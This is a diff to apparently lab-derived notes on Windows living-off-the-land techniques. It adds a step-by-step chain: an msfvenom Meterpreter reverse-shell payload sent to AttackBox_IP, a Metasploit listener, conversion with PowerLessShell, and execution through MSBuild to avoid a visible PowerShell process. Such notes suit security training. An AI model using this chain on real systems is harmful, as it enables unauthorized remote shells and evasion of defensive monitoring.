@@ -88,11 +88,24 @@ Regsvr32 Options (second option):
  	/i:: Use another server since we used /n
  	/u   Run with unregister method
 
-
-Lateral movement:
-
-Security product bypass:
-
+Other techniques:
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+                                PowerLessShell is a Python-based tool that generates malicious code to run on a target machine
+                                without showing an instance of the PowerShell process.
+                                One of the project requirements is to get a PowerShell payload to make it suitable to work
+                                with MSBuild. We need to generate a PowerShell payload using msfvenom
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
+                                We need to run the Metasploit framework to listen and wait for the reverse shell
+mv liv0ff.ps1 /tmp              Change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool.
+PowerLessShell -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+                                Run the PowerLessShell tool and set the source file to the one we created with msfvenom
+                                Once the command is executed successfully, we need to transfer the output file to the Windows machine.
+                                You can do this using the `SCP` command or set a web server to host the file on the AttackBox (`python3 -m http.server 1337`)
+                                and download the file using the browser.
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Downloads\liv0ff.csproj
+                                On the target Windows machine, build the `.csproj` file and wait for the reverse shell
+                                Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell
+                                Note that there will be no `powershell.exe` process is running
 
 Informational:
 Living Off the Land encompasses categories:
